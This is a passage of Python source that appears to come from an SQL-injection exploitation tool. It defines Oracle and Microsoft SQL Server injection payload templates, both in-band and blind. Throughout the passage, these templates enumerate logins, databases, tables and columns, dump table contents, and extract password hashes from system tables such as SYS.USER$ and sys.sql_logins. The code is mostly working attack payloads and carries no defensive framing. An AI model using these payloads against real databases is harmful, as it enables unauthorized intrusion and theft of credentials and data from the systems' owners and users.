      c = "SELECT COUNT(*) FROM SYS.USER$"
      q = "SELECT X FROM (SELECT NAME||CHR(58)||PASSWORD X,ROWNUM-1 R FROM SYS.USER$) WHERE R=${row_pos}"
    return c, q

  def enum_dbs(self):
    c = 'SELECT COUNT(DISTINCT(OWNER)) FROM SYS.ALL_TABLES'
    q = 'SELECT X FROM (SELECT OWNER X,ROWNUM-1 R FROM (SELECT DISTINCT(OWNER) FROM SYS.ALL_TABLES)) WHERE R=${row_pos}'
    return c, q

  def enum_tables(self, db):
    if not db:
      raise NotImplementedError('-D required')

    c = "SELECT COUNT(*) FROM SYS.ALL_TABLES WHERE OWNER='%s'" % db.upper()
    q = "SELECT X FROM (SELECT TABLE_NAME X,ROWNUM-1 R FROM SYS.ALL_TABLES WHERE OWNER='%s') WHERE R=${row_pos}" % db.upper()
    return c, q

  def enum_columns(self, db, table):
    if not (db and table):
      raise NotImplementedError('-D and -T required')

    c = "SELECT COUNT(*) FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME='%s' AND OWNER='%s'" % (table.upper(), db.upper())
    q = "SELECT X FROM (SELECT COLUMN_NAME X,ROWNUM-1 R FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME='%s' AND OWNER='%s') WHERE R=${row_pos}" % (table.upper(), db.upper())
    return c, q

  def dump_table(self, db, table, cols):
    if not (db and table and cols):
      raise NotImplementedError('-D, -T and -C required')

    c = "SELECT COUNT(*) FROM %s" % table.upper()
    q = "SELECT X FROM (SELECT %s X,ROWNUM-1 R FROM %s) WHERE R=${row_pos}" % ('||chr(58)||'.join(cols.split(',')), table.upper())
    return c, q

# }}}

# MSSQL_Inband {{{
class MSSQL_Inband(SQLi_Base):

  def banner(self):
    return '(SELECT @@VERSION X)a'

  def current_user(self):
    return '(SELECT SYSTEM_USER X)a'

  def current_db(self):
    return '(SELECT DB_NAME() X)a'

  def hostname(self):
    return '(SELECT @@SERVERNAME X)a'

  def enum_users(self):
    c = '(SELECT LTRIM(STR(COUNT(*))) X FROM master..syslogins)a'
    q = '(SELECT TOP ${row_count} name X FROM master..syslogins WHERE name' \
        ' NOT IN (SELECT TOP ${row_pos} name FROM master..syslogins))a'
    return c, q

  def enum_passwords(self, user):
    c = "(SELECT LTRIM(STR(COUNT(*))) X FROM master.sys.sql_logins)a"
    q = "(SELECT TOP ${row_count} name+char(58)+CAST(master.dbo.fn_varbintohexstr(password_hash) AS NVARCHAR(4000)) X FROM sys.sql_logins WHERE name" \
        " NOT IN (SELECT TOP ${row_pos} name FROM master..syslogins))a"
    return c, q

  def enum_dbs(self):
    c = '(SELECT LTRIM(STR(COUNT(*))) X FROM master..sysdatabases)a'
    q = '(SELECT TOP ${row_count} name X FROM master..sysdatabases WHERE name' \
        ' NOT IN (SELECT TOP ${row_pos} name FROM master..sysdatabases))a'
    return c, q

  def enum_tables(self, db):
    if not db:
      raise NotImplementedError('-D required')

    c = T('(SELECT LTRIM(STR(COUNT(*))) X FROM ${db}..sysobjects WHERE xtype=CHAR(85))a', db=db)
    q = T('(SELECT TOP ${row_count} name X FROM ${db}..sysobjects WHERE xtype=CHAR(85) AND name' \
         ' NOT IN (SELECT TOP ${row_pos} name FROM ${db}..sysobjects WHERE xtype=CHAR(85)))a', db=db)
    return c, q

  def enum_columns(self, db, table):
    if not (db and table):
      raise NotImplementedError('-D and -T required')

    c = T("(SELECT LTRIM(STR(COUNT(*))) X FROM ${db}..syscolumns x,${db}..sysobjects y WHERE x.id=y.id AND y.name='${table}')a", db=db, table=table)
    q = T("(SELECT TOP ${row_count} x.name X FROM ${db}..syscolumns x,${db}..sysobjects y WHERE x.id=y.id AND y.name='${table}'" \
          " AND x.name NOT IN (SELECT TOP ${row_pos} x.name FROM ${db}..syscolumns x,${db}..sysobjects y WHERE x.id=y.id AND y.name='${table}'))a ", db=db, table=table)
    return c, q

  def dump_table(self, db, table, cols):
    if not (db and table and cols):
      raise NotImplementedError('-D, -T and -C required')

    c = T('(SELECT LTRIM(STR(COUNT(*))) X FROM ${db}..${table})a', db=db, table=table)
    q = T('(SELECT TOP ${row_count} ${cols} X FROM ${db}..${table} WHERE ${cols}' \
          ' NOT IN (SELECT TOP ${row_pos} ${cols} FROM ${db}..${table}))a', cols="+char(58)+".join('CAST(%s AS NVARCHAR(4000))' % c for c in cols.split(',')), db=db, table=table) # FIXME no need to have cols everywhere?
    return c, q

# }}}

# MSSQL_Blind {{{
class MSSQL_Blind(SQLi_Base):

  def banner(self):
    return 'SELECT @@VERSION'

  def current_user(self):
    return 'SELECT SYSTEM_USER'

  def current_db(self):
    return 'SELECT DB_NAME()'

  def hostname(self):
    return 'SELECT @@SERVERNAME'

  def enum_users(self):
    c = 'SELECT LTRIM(STR(COUNT(name))) FROM master..syslogins'
    q = 'SELECT TOP 1 name FROM master..syslogins WHERE name' \
        ' NOT IN (SELECT TOP ${row_pos} name FROM master..syslogins)'
    return c, q

  def enum_passwords(self, user):
    if not user:
      raise NotImplementedError('-U required')

    c = T("SELECT LTRIM(STR(COUNT(password_hash))) FROM sys.sql_logins WHERE name='${user}'", user=user)
    q = T("SELECT TOP 1 master.dbo.fn_varbintohexstr(password_hash) FROM sys.sql_logins WHERE name='${user}'"\
        " AND password_hash NOT IN (SELECT TOP ${row_pos} password_hash FROM sys.sql_logins WHERE name='${user}')", user=user)
    return c, q

  def enum_dbs(self):
    c = 'SELECT LTRIM(STR(COUNT(name))) FROM master..sysdatabases'
    q = 'SELECT TOP 1 name FROM master..sysdatabases WHERE name' \
        ' NOT IN (SELECT TOP ${row_pos} name FROM master..sysdatabases)'
    return c, q

  def enum_tables(self, db):
    if not db:
      raise NotImplementedError('-D required')

    c = T("SELECT LTRIM(STR(COUNT(name))) FROM %s..sysobjects WHERE xtype=CHAR(85)", db=db)
    q = T("SELECT TOP 1 name FROM ${db}..sysobjects WHERE xtype=CHAR(85) AND name" \
          " NOT IN (SELECT TOP ${row_pos} name FROM ${db}..sysobjects WHERE xtype=CHAR(85))", db=db)
    return c, q

  def enum_columns(self, db, table):
    if not (db and table):
      raise NotImplementedError('-D and -T required')

    c = T("SELECT LTRIM(STR(COUNT(x.name))) FROM ${db}..syscolumns x,${db}..sysobjects y WHERE x.id=y.id AND y.name='${table}'", db=db, table=table)
    q = T("SELECT TOP 1 x.name FROM ${db}..syscolumns x,${db}..sysobjects y WHERE x.id=y.id AND y.name='${table}' AND x.name" \
          " NOT IN (SELECT TOP ${row_pos} x.name FROM ${db}..syscolumns x,${db}..sysobjects y WHERE x.id=y.id AND y.name='${table}')", db=db, table=table)
    return c, q

  def dump_table(self, db, table, cols):
    if not (db and table and cols):
      raise NotImplementedError('-D, -T and -C required')

    c = T("SELECT LTRIM(STR(COUNT(*))) FROM ${db}..${table}", db=db, table=table)
    q = T("SELECT TOP 1 ${cols} FROM ${db}..${table} WHERE ${cols}" \
          " NOT IN (SELECT TOP ${row_pos} ${cols} FROM ${db}..${table} ORDER BY 1) ORDER BY 1", cols="+char(58)+".join(cols.split(',')), table=table, db=db)
    return c, q

# }}}

# vim: ts=2 sw=2 sts=2 et fdm=marker
